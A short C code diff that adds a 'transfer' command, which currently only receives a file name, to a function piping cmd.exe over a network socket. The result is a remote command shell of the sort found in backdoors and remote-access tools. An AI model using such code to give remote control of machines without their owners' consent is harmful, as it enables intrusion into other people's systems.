@@ -101,6 +101,7 @@ void CommandPrompt(void) //the function which handles the complete commandprompt
 	HANDLE newstdin, newstdout, readout, writein; //the handles for our Pipes
 	char exit1[] = { 'e','x','i','t',10,0 }; //we need this to compare our command to 'exit'
 	char exit2[] = { 'E','X','I','T',10,0 }; //we need this to compare our command to 'EXIT'
+	char transfer[] = { 't','r','a','n','s','f','e','r',10,0 }; //we need this to compare our command to 'transfer'
 
 	//create the pipes for our command prompt
 	CreatePipe(&newstdin, &writein, &secat, 0);
@@ -160,6 +161,15 @@ void CommandPrompt(void) //the function which handles the complete commandprompt
 			//let cmd.exe close by giving the command, then go to closeup label
 			WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
 			goto closeup;
+		}
+		// if command is 'transfer' then we have to capture it to prevent our program
+		else if (strcmp(bufferin, transfer) == 0)
+		{
+			// Wait for the client to send the file name
+			recv(remsock, bufferin, sizeof(bufferin), 0);
+			// Once the file name is received, say file name received and break
+			send(remsock, "File name received", sizeof("File name received"), 0);
+			break;
 		}
 		//else write the command to cmd.exe
 		WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
